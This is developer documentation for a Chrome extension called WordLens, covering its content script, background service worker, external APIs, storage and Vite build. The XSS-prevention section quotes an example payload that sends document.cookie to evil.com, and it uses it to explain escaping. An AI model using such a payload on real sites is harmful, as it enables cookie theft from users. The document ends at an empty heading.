# WordLens — Complete Developer Documentation

> A calm, powerful Chrome Extension that lets you look up words, summarise sentences, and translate text without leaving the page — paired with a React landing page and a built-in PDF reader.

---

## Table of Contents

1. [Project Architecture Overview](#1-project-architecture-overview)
2. [File Tree Explained](#2-file-tree-explained)
3. [The Chrome Extension Mechanics (deep-dive)](#3-the-chrome-extension-mechanics)
   - [manifest.json — The Foundation](#31-manifestjson--the-foundation)
   - [content.js — The Brain](#32-contentjs--the-brain)
   - [background.js — The Proxy](#33-backgroundjs--the-proxy)
   - [content.css — The Skin](#34-contentcss--the-skin)
4. [Data Flow: From Highlight to API to Screen](#4-data-flow-from-highlight-to-api-to-screen)
5. [The Three APIs](#5-the-three-apis)
6. [Storage: Saving Words and API Keys](#6-storage-saving-words-and-api-keys)
7. [The Options / Dashboard Page](#7-the-options--dashboard-page)
8. [The Landing Page (React / Vite)](#8-the-landing-page-react--vite)
9. [The Build System (Vite)](#9-the-build-system-vite)
10. [Key Concepts Explained Simply](#10-key-concepts-explained-simply)

---

## 1. Project Architecture Overview

WordLens is split into **two separate worlds** that share one repository and build pipeline:

```
┌─────────────────────────────────────────────────────┐
│                 VITE BUILD (npm run build)           │
│                                                     │
│  ┌──────────────────┐   ┌────────────────────────┐  │
│  │  LANDING PAGE    │   │   CHROME EXTENSION     │  │
│  │  (React + JSX)   │   │  (Vanilla JS, no React)│  │
│  │                  │   │                        │  │
│  │  src/App.jsx     │   │  extension/content.js  │  │
│  │  src/main.jsx    │   │  extension/background.js│  │
│  │  src/index.css   │   │  extension/content.css │  │
│  │  index.html ─────┼───┼─▶ dist/index.html      │  │
│  │                  │   │  public/manifest.json  │  │
│  │  Options.jsx ────┼───┼─▶ dist/options.html    │  │
│  │  PdfViewer.jsx───┼───┼─▶ dist/pdf-viewer.html │  │
│  └──────────────────┘   └────────────────────────┘  │
└─────────────────────────────────────────────────────┘
```

**Why no React in the extension itself?**  
React adds ~130 kB and needs a compile step. Content scripts run directly inside real websites as plain JavaScript. Keeping them vanilla JS means zero overhead, instant startup, and no conflicting framework globals with the host page.

---

## 2. File Tree Explained

```
WordLens/
│
├── extension/              ← EXTENSION CORE (pure JS + CSS)
│   ├── content.js          ← Injected into every page (popup, UI, events)
│   ├── background.js       ← Service worker (API calls, opens options)
│   ├── content.css         ← Isolated styles for the floating popup
│   └── popup.html          ← Tiny HTML shell for the toolbar button popup
│
├── public/                 ← Copied verbatim into dist/
│   ├── manifest.json       ← Chrome Extension configuration
│   └── icons/icon.png      ← Brand icon (Chrome toolbar + favicon)
│
├── src/                    ← LANDING PAGE + OPTIONS (React)
│   ├── main.jsx            ← Landing page entry point
│   ├── App.jsx             ← Main landing page component
│   ├── index.css           ← Global CSS / design tokens (Tailwind)
│   ├── components/ui/
│   │   └── dynamic-hero.jsx  ← Mouse-tracking hero with canvas arrow
│   └── pages/
│       ├── options/Options.jsx   ← Saved Words dashboard
│       └── pdf-viewer/PdfViewer.jsx ← Built-in react-pdf reader
│
├── index.html              ← Vite entry for landing page
├── options.html            ← Vite entry for Options dashboard
├── pdf-viewer.html         ← Vite entry for PDF reader
├── vite.config.js          ← Multi-page Vite config + extension copy plugin
├── make_icon.cjs           ← Script: renders SVG "W" logo → icon.png via sharp
└── package.json
```

---

## 3. The Chrome Extension Mechanics

### 3.1 `manifest.json` — The Foundation

The manifest is the **ID card** of every Chrome Extension. Chrome reads it before loading anything else.

#### Key Fields Explained

| Field | What it does |
|---|---|
| `manifest_version: 3` | Required since 2023. MV3 replaced MV2; Service Workers replace persistent background pages. |
| `permissions: ["activeTab","storage"]` | `activeTab` = can inspect the current tab. `storage` = can use `chrome.storage.local`. Minimally requested. |
| `host_permissions` | URLs that `background.js` is allowed to `fetch()`. Without this, Chrome blocks the requests with a CORS error. |
| `background.service_worker` | Points to `background.js`. Chrome loads this as a Service Worker — wakes on demand, sleeps when idle. |
| `content_scripts` | Tells Chrome to auto-inject `content.js` + `content.css` into every URL (`<all_urls>`) after page load (`document_idle`). |
| `action.default_popup` | HTML shown when user clicks the extension icon in the Chrome toolbar. |
| `options_page` | Points to `options.html`. Opens when user clicks "Extension options" or the Settings button in the popup. |

---

### 3.2 `content.js` — The Brain

Injected by Chrome into every webpage the user visits. Has **full DOM access** but **no cross-origin fetch** (that lives in background.js).

#### Module-Level State Variables

```js
const POPUP_ID = 'wordlens-popup-root'; // Unique ID — prevents duplicate injection
let popupEl = null;          // Reference to our injected <div>
let isDragging = false;      // True while user is dragging the popup card
let dragOffsetX = 0;         // Grab offset X (so card doesn't snap to cursor corner)
let dragOffsetY = 0;
let currentTab = 'dictionary'; // Which content tab is active
let currentSelection = '';      // The highlighted text
let isCurrentSelectionWord = true; // Single word? Or a sentence?
```

Variables declared at the top level of the file (not inside any function) **persist for the lifetime of the page**. Every function reads and writes the same shared memory.

---

#### `initWordLens()` — Entry Point

```js
function initWordLens() {
  // Guard: Chrome can double-inject on SPAs — only mount once
  if (document.getElementById(POPUP_ID)) return;

  popupEl = document.createElement('div');
  popupEl.id = POPUP_ID;
  document.body.appendChild(popupEl); // Glued to the bottom of every page

  document.addEventListener('mouseup', handleMouseUp);
  document.addEventListener('mousedown', handleMouseDown);
  setupDrag();
}

initWordLens(); // Runs immediately when the script is injected
```

Without the guard check, navigating on a React or Vue SPA (which replaces content without a real page reload) could cause `initWordLens` to fire multiple times, stacking event listeners and popup elements on top of each other.

---

#### `handleMouseUp()` — The Trigger

Every text selection ends with a `mouseup`. This is the function that kicks everything off.

```js
function handleMouseUp(event) {
  // 1. If we were dragging our popup, ignore this mouseup
  if (isDragging) { isDragging = false; return; }

  // 2. If the click was INSIDE the popup, don't re-trigger lookup
  if (popupEl.contains(event.target)) return;

  // 3. Small delay so the browser commits the selection
  setTimeout(() => {
    const selection = window.getSelection();
    const text = selection.toString().trim();

    if (text.length > 0 && text.length < 300) {
      // Is it one word, or is it a phrase/sentence?
      // /\s+/ = "one or more whitespace characters"
      const isWord = text.split(/\s+/).length === 1;

      const range = selection.getRangeAt(0);
      const rect = range.getBoundingClientRect(); // Screen position of selected text

      showPopup(rect.left + window.scrollX, rect, text, isWord);
    } else if (text.length === 0) {
      hidePopup(); // User clicked away with no selection
    }
  }, 10);
}
```

**Why `setTimeout(10ms)`?**  
When a mouse-drag selection ends, `mouseup` fires slightly before the browser finalises `window.getSelection()`. Without this tiny delay, `selection.toString()` sometimes returns an empty string even though text is highlighted.

**The regex `/\s+/`:**  
`"hello".split(/\s+/)` → `["hello"]` (length = 1 → word)  
`"hello world".split(/\s+/)` → `["hello","world"]` (length = 2 → sentence)  
This single line decides whether to open the Dictionary tab or the AI Summary tab.

---

#### `showPopup()` — Smart Positioning

Positions the popup intelligently so it never bleeds off-screen.

```js
function showPopup(x, rect, text, isWord) {
  let safeX = x;
  // Don't overflow the right edge (popup is ~330px wide)
  if (safeX + 340 > window.innerWidth + window.scrollX)
    safeX = window.innerWidth + window.scrollX - 340;
  if (safeX < 20) safeX = 20; // Don't overflow the left edge

  // Flip above the selection if there is not enough room below
  const spaceBelow = window.innerHeight - rect.bottom;
  const safeY = spaceBelow < 250
    ? rect.top + window.scrollY - 250 - 8  // Above the selection
    : rect.bottom + window.scrollY + 8;    // Below the selection

  popupEl.style.left = `${safeX}px`;
  popupEl.style.top  = `${safeY}px`;
  popupEl.style.display = 'block';

  // Reading offsetWidth forces a browser layout recalculation.
  // Without this, the CSS transition from opacity:0 to opacity:1 is skipped.
  void popupEl.offsetWidth;
  popupEl.classList.add('wl-show');

  renderMasterContainer(text, isWord);
}
```

**`void popupEl.offsetWidth`** is a well-known browser trick. CSS transitions only animate when they see a *change* between two states. If `display:block` and `classList.add` happen in the same frame, the browser may batch them as one operation and skip the animation. Forcing a layout read breaks the batch.

---

#### `renderMasterContainer()` — Building the Popup HTML

Completely replaces the popup's inner HTML with the full card structure on every call.

```js
function renderMasterContainer(text, isWord) {
  currentSelection = text;
  currentTab = isWord ? 'dictionary' : 'ai';

  popupEl.innerHTML = `
    <div class="wl-card wl-card-layout">

      <!-- LEFT: Navigation Sidebar -->
      <div class="wl-sidebar">
        <button class="wl-tab-btn ${currentTab === 'dictionary' ? 'active' : ''}" id="wl-tab-dict">
          [book svg icon]
          <span>Dictionary</span>
        </button>
        <button class="wl-tab-btn ..." id="wl-tab-ai">...</button>
        <button class="wl-tab-btn" id="wl-tab-trans">...</button>

        <div class="wl-spacer"></div> <!-- CSS flex spacer pushes next items to bottom -->

        <button class="wl-action-btn" id="wl-btn-save">
          <svg id="wl-icon-save" ...> [star] </svg>
          <span>Save</span>
        </button>
        <button class="wl-action-btn" id="wl-btn-settings">...</button>
      </div>

      <!-- RIGHT: Content Area -->
      <div class="wl-content-area relative" id="wl-main-content">
        <!-- wordlens® watermark (top-right, semi-transparent) -->
        <!-- Results injected here by loadTabContent() -->
      </div>

    </div>
  `;

  setupTabListners(); // Attach all button click handlers
  loadTabContent();   // Kick off the API request
}
```

The `${ currentTab === 'dictionary' ? 'active' : '' }` expression inside the template literal is plain JavaScript embedded in the string — it conditionally adds the `active` CSS class to the correct button on initial render.

---

#### `setupTabListners()` — Wiring Up the UI

Called after every HTML rebuild. Attaches click handlers to all interactive elements.

**Tab switching:**
```js
document.getElementById('wl-tab-dict').addEventListener('click', () => {
  currentTab = 'dictionary';
  updateActiveTabStyles(); // Moves the green highlight to the right button
  loadTabContent();        // Triggers the dictionary API call
});
// Same pattern for wl-tab-ai and wl-tab-trans
```

**Save Word:**
```js
document.getElementById('wl-btn-save').addEventListener('click', () => {
  const word = currentSelection;

  // Scrape the definition that is currently *visible* in the DOM
  const definitionEl = document.querySelector('#wl-main-content .wl-definition');
  const exampleEl    = document.querySelector('#wl-main-content .wl-example');
  let meaning = definitionEl?.textContent || '';
  if (exampleEl) meaning += ' ' + exampleEl.textContent;

  if (!word || !meaning) return; // Don't save if content is still loading

  chrome.storage.local.get(['savedWords'], (result) => {
    const words = result.savedWords || [];
    const duplicate = words.findIndex(w => w.word.toLowerCase() === word.toLowerCase());

    if (duplicate === -1) {
      // Not a duplicate — save it
      words.push({ word, meaning, date: Date.now() });
      chrome.storage.local.set({ savedWords: words }, () => {
        // Visually fill the star icon with the accent green
        document.getElementById('wl-icon-save')?.setAttribute('fill', 'currentColor');
        const span = document.querySelector('#wl-btn-save span');
        if (span) span.textContent = 'Saved!';
      });
    } else {
      // Already saved — show feedback without saving again
      const span = document.querySelector('#wl-btn-save span');
      if (span) {
        span.textContent = 'Already';
        setTimeout(() => { span.textContent = 'Saved'; }, 2000);
      }
    }
  });
});
```

**Text-to-Speech (Event Delegation):**
```js
// One listener on the parent catches clicks on ANY speak button inside it
document.getElementById('wl-main-content').addEventListener('click', (e) => {
  // .closest() walks UP the DOM tree looking for a matching ancestor
  const speakBtn = e.target.closest('.wl-speak-btn');
  if (!speakBtn) return;

  const text = speakBtn.dataset.text || currentSelection;
  const utterance = new SpeechSynthesisUtterance(text);
  utterance.lang = 'en-US';
  utterance.rate = 0.9; // Slightly slower for clarity
  window.speechSynthesis.speak(utterance);
});
```

> **Event Delegation explained:** If you added a click listener directly to each speak button, those listeners would be *destroyed* the next time `loadTabContent()` rebuilds the HTML. By attaching the listener to the stable parent container, it survives all HTML rebuilds and handles any number of child buttons automatically.

**Settings button:**
```js
document.getElementById('wl-btn-settings').addEventListener('click', () => {
  // Can't call chrome.runtime.openOptionsPage() from a content script directly.
  // Must go via the background service worker.
  chrome.runtime.sendMessage({ type: 'OPEN_OPTIONS_PAGE' });
});
```

**Pre-fill saved state on load:**
```js
// Check storage immediately after every popup open
chrome.storage.local.get(['savedWords'], (result) => {
  const words = result.savedWords || [];
  const alreadySaved = words.some(w => w.word.toLowerCase() === currentSelection.toLowerCase());
  if (alreadySaved) {
    // Fill the star and change label without waiting for user to click
    document.getElementById('wl-icon-save')?.setAttribute('fill', 'currentColor');
    const span = document.querySelector('#wl-btn-save span');
    if (span) span.textContent = 'Saved';
  }
});
```

---

#### `loadTabContent()` — The API Router

Shows a loading skeleton instantly, then dispatches to the correct API.

```js
function loadTabContent() {
  const area = document.getElementById('wl-main-content');

  // Immediate feedback — skeleton appears while awaiting API
  area.innerHTML = `
    <div class="wl-header">
      <h3 class="wl-word">${escapeHTML(currentSelection.slice(0, 30))}</h3>
      <button class="wl-speak-btn" data-text="${escapeHTML(currentSelection)}">...</button>
    </div>
    <div class="wl-skeleton-pulse"></div>
    <div class="wl-skeleton-pulse" style="width:80%"></div>
  `;

  if (currentTab === 'dictionary') {
    if (!isCurrentSelectionWord) {
      area.innerHTML = renderErrorHtml(currentSelection, 'Dictionary tab only works for single words. Try Summary or Translate!');
      return;
    }
    chrome.runtime.sendMessage({ type: 'LOOKUP_WORD', word: currentSelection }, (response) => {
      // Race condition guard — user may have closed or switched tab while waiting
      if (!popupEl.classList.contains('wl-show') || currentTab !== 'dictionary') return;
      area.innerHTML = response?.success
        ? renderDefinitionHtml(response.data)
        : renderErrorHtml(currentSelection, 'Word not found. Try Summary or Translate!');
    });

  } else if (currentTab === 'ai') {
    chrome.storage.local.get(['groqApiKey'], (result) => {
      if (!result.groqApiKey) {
        area.innerHTML = renderErrorHtml(currentSelection, 'Add your Groq API key in Settings to unlock AI Summary.');
        return;
      }
      chrome.runtime.sendMessage(
        { type: 'SUMMARIZE_SENTENCE', text: currentSelection, apiKey: result.groqApiKey },
        (response) => {
          if (!popupEl.classList.contains('wl-show') || currentTab !== 'ai') return;
          area.innerHTML = response?.success
            ? renderSummaryHtml(currentSelection, response.data.summary)
            : renderErrorHtml(currentSelection, response?.error || 'AI request failed.');
        }
      );
    });

  } else if (currentTab === 'translate') {
    chrome.runtime.sendMessage({ type: 'TRANSLATE_TEXT', text: currentSelection }, (response) => {
      if (!popupEl.classList.contains('wl-show') || currentTab !== 'translate') return;
      area.innerHTML = response?.success
        ? renderSummaryHtml(currentSelection, response.data.translation)
        : renderErrorHtml(currentSelection, response?.error || 'Translation failed.');
    });
  }
}
```

---

#### `setupDrag()` — Draggable Popup

Makes the popup card freely draggable anywhere on the page.

```js
function setupDrag() {
  popupEl.addEventListener('mousedown', (e) => {
    if (e.target.tagName === 'INPUT' || e.target.tagName === 'TEXTAREA') return;
    isDragging = true;

    const rect = popupEl.getBoundingClientRect();
    // Store where inside the card we grabbed it
    dragOffsetX = e.clientX - rect.left;
    dragOffsetY = e.clientY - rect.top;

    popupEl.style.cursor = 'grabbing';
    e.preventDefault(); // Block accidental text selection during drag
  });

  document.addEventListener('mousemove', (e) => {
    if (!isDragging) return;
    // New position = mouse position - where we grabbed inside the card + scroll offset
    popupEl.style.left = `${e.clientX + window.scrollX - dragOffsetX}px`;
    popupEl.style.top  = `${e.clientY + window.scrollY - dragOffsetY}px`;
  });

  document.addEventListener('mouseup', () => {
    if (isDragging) popupEl.style.cursor = 'grab';
    // isDragging is reset to false in handleMouseUp
  });
}
```

**The offset trick:** If you grab the card 60px from its left edge and 20px from its top, the card should always stay exactly 60px left and 20px above your cursor — it does not jump its corner to the cursor position. `dragOffsetX` and `dragOffsetY` store this gap.

---

#### HTML Renderer Functions

Three pure functions that return HTML strings:

**`renderDefinitionHtml(data)`** — for Dictionary results  
Builds the word title with phonetic, a part-of-speech tag, definition text, and an italicised example sentence. The speak button stores the word in `data-text` so the speech API knows exactly what to say.

**`renderSummaryHtml(title, text)`** — for AI Summary and Translation  
Shows a compact title and the body text in a scrollable container. The speak button stores the full summary text in `data-text`.

**`renderErrorHtml(title, errorMsg)`** — for failures  
Displays the searched text as a heading and the error message in muted colour. No emojis — clean, minimal feedback.

---

#### `escapeHTML()` — XSS Prevention

```js
function escapeHTML(str) {
  const div = document.createElement('div');
  div.textContent = str; // Browser encodes < > & " as HTML entities
  return div.innerHTML;  // Returns the safely encoded string
}
```

Every piece of user-selected text and every API response passes through this before being injected into `innerHTML`. Without it, selecting text like `<img src=x onerror="fetch('evil.com?c='+document.cookie)">` from a malicious page would execute inside our popup — a classic XSS attack. `escapeHTML` converts those characters to harmless `&lt;`, `&gt;`, `&amp;`.

---

### 3.3 `background.js` — The Proxy

Content scripts live inside web pages and are bound by **CORS (Cross-Origin Resource Sharing)** — browsers block them from fetching arbitrary external URLs. Background Service Workers have no such restriction.

```
web page → content.js  ──sendMessage──▶  background.js  ──fetch()──▶  external API
                        ◀──sendResponse──                ◀──response──
```

#### Message Router

```js
chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {

  if (message.type === 'LOOKUP_WORD') {
    lookupWord(message.word)
      .then(data => sendResponse({ success: true, data }))
      .catch(err  => sendResponse({ success: false, error: err.message }));
    return true; // Keep channel open for async response
  }

  if (message.type === 'SUMMARIZE_SENTENCE') {
    summarizeSentence(message.text, message.apiKey)
      .then(data => sendResponse({ success: true, data }))
      .catch(err  => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (message.type === 'TRANSLATE_TEXT') {
    translateText(message.text)
      .then(data => sendResponse({ success: true, data }))
      .catch(err  => sendResponse({ success: false, error: err.message }));
    return true;
  }

  if (message.type === 'OPEN_OPTIONS_PAGE') {
    chrome.runtime.openOptionsPage();
    return true;
  }
});
```

**Why `return true` is critical:**  
Chrome's message channel is synchronous by default — the moment the listener function returns, Chrome closes the `sendResponse` pipe. Since all our operations are async (`await fetch(...)`), we must `return true` to tell Chrome: "I will call sendResponse later. Please keep the channel open."  
If you forget this, the callback in `content.js` never fires, and you get silent failures.

#### `lookupWord(word)` — Dictionary API

```js
async function lookupWord(word) {
  const url = `https://api.dictionaryapi.dev/api/v2/entries/en/${encodeURIComponent(word)}`;
  const response = await fetch(url);
  if (!response.ok) throw new Error('Word not found');

  const entry = (await response.json())[0]; // API returns an array; take the first entry

  // Optional chaining (?.) safely handles missing fields without throwing errors
  const phonetic = entry.phonetic
    || entry.phonetics?.find(p => p.text)?.text
    || '';

  return {
    word: entry.word,
    phonetic,
    meanings: entry.meanings.map(m => ({
      partOfSpeech: m.partOfSpeech,
      definition: m.definitions[0]?.definition || '',
      example: m.definitions[0]?.example || '',
    })),
  };
}
```

`encodeURIComponent()` URL-encodes special characters. The word "can't" becomes `can%27t`, ensuring the URL is valid. `?.` (optional chaining) returns `undefined` if the property doesn't exist, avoiding `TypeError: Cannot read property of undefined`.

#### `summarizeSentence(text, apiKey)` — Groq AI

```js
async function summarizeSentence(text, apiKey) {
  const response = await fetch('https://api.groq.com/openai/v1/chat/completions', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${apiKey}`, // Groq uses Bearer token authentication
    },
    body: JSON.stringify({
      model: 'llama-3.3-70b-versatile', // Groq's free, fast open-source LLM
      max_tokens: 300,    // Limits response length for concise answers
      temperature: 0.4,   // 0 = deterministic, 1 = highly creative, 0.4 = balanced
      messages: [
        {
          role: 'system',
          // Personality prompt: sets how the AI behaves throughout the conversation
          content: 'You are a quiet, well-read reading companion. Give concise, plain-English explanations in 1-3 sentences. Be warm but brief. No bullet points, no headers.'
        },
        {
          role: 'user',
          content: `The user highlighted this text: "${text}". What does it mean? What tone does it carry?`
        }
      ]
    }),
  });

  if (!response.ok) throw new Error(`Groq error ${response.status}`);
  const json = await response.json();
  return { summary: json.choices[0].message.content }; // OpenAI response format
}
```

Groq uses the **OpenAI Chat Completions format** exactly. `messages` is a conversation array: `system` sets the AI's persona, `user` is the actual question. `choices[0].message.content` is where the response text lives.

#### `translateText(text)` — Google Translate

```js
async function translateText(text) {
  // client=gtx: unofficial but stable free endpoint
  // sl=auto: auto-detect source language
  // tl=en: translate to English
  const url = `https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl=en&dt=t&q=${encodeURIComponent(text)}`;
  const json = await (await fetch(url)).json();

  // Response is deeply nested arrays: json[0] = chunks, chunk[0] = translated text
  let translated = '';
  json[0].forEach(chunk => { if (chunk[0]) translated += chunk[0]; });
  return { translation: translated };
}
```

---

### 3.4 `content.css` — The Skin

All styles are scoped inside `#wordlens-popup-root` — our styles can't leak onto any host page, and host page styles can't override ours.

#### CSS Design Tokens (Custom Properties)

```css
#wordlens-popup-root {
  --wl-surface:       #171717;   /* Dark card background */
  --wl-border:        #333333;   /* Subtle dividers */
  --wl-text:          #FAFAFA;   /* Near-white text */
  --wl-muted:         #A3A3A3;   /* Grey secondary text */
  --wl-accent:        #4ade80;   /* Green (Tailwind green-400) */
  --wl-accent-light:  #14532d;   /* Dark green for tag chips */
}
```

Changing these 6 values re-themes the entire popup. Every child element uses `var(--wl-accent)` instead of hardcoding `#4ade80`.

#### Entry/Exit Animation

```css
#wordlens-popup-root {
  display: none;
  opacity: 0;
  transform: translateY(10px);
  transition: opacity 0.2s ease, transform 0.2s ease;
}
#wordlens-popup-root.wl-show {
  opacity: 1;
  transform: translateY(0);
}
```

The popup starts invisible, 10px below final position. Adding `.wl-show` transitions both to 0 — a smooth "float up" entrance.

#### Loading Skeleton

```css
.wl-skeleton-pulse {
  animation: wl-pulse 1.5s infinite;
  background-color: #333;
  border-radius: 4px;
  height: 14px;
}
@keyframes wl-pulse {
  0%, 100% { opacity: 0.6; }
  50%       { opacity: 1;   }
}
```

Pulsing grey bars during API load — far better than a blank space.

#### Sidebar Layout

```css
.wl-card-layout { display: flex; flex-direction: row; min-height: 180px; }
.wl-sidebar     { width: 120px; display: flex; flex-direction: column; padding: 10px 8px; }
.wl-content-area { flex: 1; padding: 12px 16px; }
.wl-spacer      { flex: 1; } /* Pushes Save + Settings buttons to the bottom of sidebar */
```

`flex: 1` on `.wl-content-area` means it takes all remaining horizontal space. `flex: 1` on `.wl-spacer` pushes everything below it (Save, Settings) to the bottom of the column.

---

## 4. Data Flow: From Highlight to API to Screen

```
USER double-clicks "ephemeral"
        │
        ▼
handleMouseUp() fires
  ├── Checks isDragging? No
  ├── Checks click inside popup? No
  └── setTimeout 10ms → window.getSelection() = "ephemeral"
        │
        ▼
isWord check: "ephemeral".split(/\s+/).length === 1 → true → Dictionary mode
        │
        ▼
showPopup(x, rect, "ephemeral", true)
  ├── Calculates safe X,Y (won't go off-screen)
  ├── Sets popupEl position via inline styles
  ├── Sets display:block, forces reflow (void offsetWidth)
  ├── Adds wl-show class → CSS fade-in animation begins
  └── Calls renderMasterContainer("ephemeral", true)
        │
        ▼
renderMasterContainer()
  ├── Sets currentTab = 'dictionary'
  ├── Writes full card HTML (sidebar + content area) via innerHTML
  ├── Calls setupTabListners() → all buttons wired up
  └── Calls loadTabContent()
        │
        ▼
loadTabContent()
  ├── Immediately shows skeleton bars + small speak button in header
  └── chrome.runtime.sendMessage({ type: 'LOOKUP_WORD', word: 'ephemeral' })
        │
        ▼ (Chrome routes to background.js)
background.js receives LOOKUP_WORD
  └── lookupWord('ephemeral')
        ├── fetch('https://api.dictionaryapi.dev/api/v2/entries/en/ephemeral')
        ├── Parses JSON response
        └── Returns { word, phonetic, meanings: [{ partOfSpeech, definition, example }] }
        │
        ▼ (sendResponse called)
content.js callback fires
  ├── response.success === true
  └── area.innerHTML = renderDefinitionHtml(response.data)
        │
        ▼
User sees:
  "ephemeral  /ɪˈfɛm.ər.əl/  🔊
   adj.   Lasting for a very short time.
   "the ephemeral pleasures of summer""

USER clicks 🔊
  └── Event delegation on #wl-main-content
      └── new SpeechSynthesisUtterance("ephemeral") → spoken aloud

USER clicks Save ★
  └── DOM scrape: .wl-definition textContent = "Lasting for a very short time."
  └── chrome.storage.local.get(['savedWords'])
  └── Not duplicate → push { word:"ephemeral", meaning:"...", date:1710123456789 }
  └── chrome.storage.local.set(...)
  └── Star fills green, span shows "Saved!"

USER clicks Settings ⚙
  └── chrome.runtime.sendMessage({ type: 'OPEN_OPTIONS_PAGE' })
  └── background.js: chrome.runtime.openOptionsPage()
  └── New tab opens → options.html → Dashboard React app
```

---

## 5. The Three APIs

| API | URL | Auth | Cost | Response Format |
|---|---|---|---|---|
| Free Dictionary | `api.dictionaryapi.dev/api/v2/entries/en/{word}` | None | Free forever | Array of entry objects with `meanings`, `phonetics`, `definitions` |
| Groq AI | `api.groq.com/openai/v1/chat/completions` | Bearer token (`gsk_...`) | Free generous tier | OpenAI format: `choices[0].message.content` |
| Google Translate | `translate.googleapis.com/translate_a/single?client=gtx` | None | Unofficial free | Nested arrays: `json[0][n][0]` = nth translated chunk |

---

## 6. Storage: Saving Words and API Keys

`chrome.storage.local` is a browser-managed key-value store:
- Survives browser restarts
- Accessible from background workers, content scripts, and options pages
- ~10 MB limit

### Data Schema

```js
// Everything in chrome.storage.local:
{
  savedWords: [
    {
      word:    "ephemeral",
      meaning: "Lasting for a very short time. \"the ephemeral pleasures of summer\"",
      date:    1710123456789  // Unix timestamp ms — unique ID + sort key
    }
  ],
  groqApiKey: "gsk_xxxxxxxxxx"
}
```

### Why `date` as unique ID?

`Date.now()` is the number of milliseconds since 1 Jan 1970. Two saves can't happen in the same millisecond, so it's effectively unique. It doubles as a sort key: `words.sort((a, b) => b.date - a.date)` = newest first. No UUID library needed.

---

## 7. The Options / Dashboard Page

`src/pages/options/Options.jsx` is a standard React component rendered at `options.html`.

### Opening It

```
content.js
  chrome.runtime.sendMessage({ type: 'OPEN_OPTIONS_PAGE' })
        ↓
background.js
  chrome.runtime.openOptionsPage()
        ↓
Chrome opens options.html in a new tab
```

`chrome.runtime.openOptionsPage()` cannot be called from a content script (which lives inside a website). It must go through the background service worker.

### Component Logic

```
Component mounts (useEffect):
  chrome.storage.local.get(['savedWords', 'groqApiKey'])
  setSavedWords(sorted newest-first by .date)
  setApiKey(stored key or '')

User hovers a word card:
  Tailwind "group-hover:opacity-100" reveals Trash2 icon

User clicks Trash:
  handleDeleteWord(item.date)
  → filter array where w.date !== deletedDate
  → setSavedWords(filtered) — React re-renders
  → chrome.storage.local.set({ savedWords: filtered }) — persists

User types API key + clicks Save Key:
  handleSaveKey()
  → chrome.storage.local.set({ groqApiKey: apiKey })
  → setSaveStatus('Saved!') — shows check icon for 2.5 seconds
```

---

## 8. The Landing Page (React / Vite)

### Logo System (`App.jsx`)

The "W" logo is **pure SVG code** — no images. 13 `<rect>` elements positioned to spell a W:

```
Left leg: mint  (#00F5D4) — 4 stacked squares
Bottom-left curve: sky blue (#00BBF9)
Middle-bottom: purple (#9B5DE5) — 2 squares
Bottom-right curve: pink (#F15BB5)
Right leg: magenta (#FF006E) — 4 stacked squares
```

`LogoSVG` renders this. `LogoBrand` composes it with the `wordlens®` wordmark — `font-bold tracking-tighter` in Helvetica/Arial gives the tight, editorial look.

### `HeroSection` (`dynamic-hero.jsx`) — Canvas Arrow

```js
// Animation loop: runs ~60 times per second
const animateLoop = () => {
  ctx.clearRect(0, 0, canvas.width, canvas.height); // Erase last frame
  drawArrow();                                        // Draw current frame
  requestAnimationFrame(animateLoop);                 // Schedule next frame
};
```

`drawArrow()` uses `ctx.quadraticCurveTo(midX, midY, x1, y1)` — a bezier curve from mouse → CTA button. Two short lines form an arrowhead. Opacity fades when the mouse gets close to the button, preventing visual clutter.

### Animated "Read" Highlight Box

```css
@keyframes read-box {
  0%   { clip-path: inset(0 100% 0 0); } /* Clipped 100% from right — invisible */
  40%  { clip-path: inset(0 0 0 0); }    /* No clip — fully visible */
  80%  { clip-path: inset(0 0 0 0); }    /* Stays visible */
  100% { clip-path: inset(0 100% 0 0); } /* Hides again */
}
.wl-read-box::after {
  content: '';
  position: absolute;
  inset: -2px -6px;
  border: 2.5px solid #9B5DE5;
  border-radius: 4px;
  animation: read-box 3.5s ease-in-out infinite;
}
```

`clip-path: inset(0 100% 0 0)` clips the element 100% from the right, making it invisible. As the value moves to `inset(0 0 0 0)`, the box draws itself from left to right — like tracing it with a pen.

### Testimonials Grid

```jsx
<div className="columns-1 md:columns-2 lg:columns-3 gap-4">
  {testimonials.map(t => <TestimonialCard ... />)}
</div>
```

CSS `columns-3` creates a newspaper-style masonry layout. Cards fill one column top-to-bottom before moving to the next column. `break-inside-avoid` ensures no card is split across columns.

---

## 9. The Build System (Vite)

`vite.config.js` defines a multi-page build:

```js
input: {
  main:        'index.html',       // Landing page → dist/index.html
  options:     'options.html',     // Dashboard → dist/options.html
  'pdf-viewer':'pdf-viewer.html',  // PDF reader → dist/pdf-viewer.html
}
```

A custom plugin then copies `extension/` files and `public/manifest.json` + `public/icons/` into `dist/` after every build, producing a complete, self-contained Chrome Extension.

```
dist/
├── index.html           ← Compiled landing page
├── options.html         ← Compiled dashboard
├── pdf-viewer.html      ← Compiled PDF reader
├── manifest.json        ← Chrome extension config (from public/)
├── icons/icon.png       ← Brand icon
├── extension/
│   ├── content.js       ← Copied as-is (no bundling)
│   ├── background.js    ← Copied as-is
│   └── content.css
└── assets/              ← Vite-hashed CSS + JS bundles
```

**Installing into Chrome:**
1. Go to `chrome://extensions`
2. Enable **Developer mode** (top right toggle)
3. Click **Load Unpacked**
4. Select the `dist/` folder

---

## 10. Key Concepts Explained Simply

### Content Script vs Background Worker — the core distinction
A content script is like a **person inside a building** — it can interact with everything in the room (the webpage DOM) but can't freely visit other buildings (external APIs) due to security rules. A background service worker is like a **courier outside** — it can go anywhere to pick up packages (API calls) and deliver results back.

### Why `return true` in message listeners
Chrome message passing is synchronous by default. Once your listener function returns, Chrome closes the pipe. When you do async work inside the listener (`await fetch(...)`), you must signal Chrome to keep the pipe open by returning `true`. Without it: the listener returns immediately, Chrome closes the channel, and your `sendResponse` call silently fails.

### Event Delegation
Instead of attaching 10 click listeners to 10 buttons, attach 1 listener to their parent. When any child is clicked, the event bubbles up to the parent. `e.target.closest('.class')` walks up the DOM tree to find if the click originated from inside a matching element. This is more efficient and survives DOM replacements.

### Optional Chaining `?.`
`obj.a.b.c` throws `TypeError` if `obj.a` is undefined. `obj?.a?.b?.c` safely returns `undefined` instead. Essential when working with API responses where fields are sometimes missing.

### XSS and `escapeHTML`
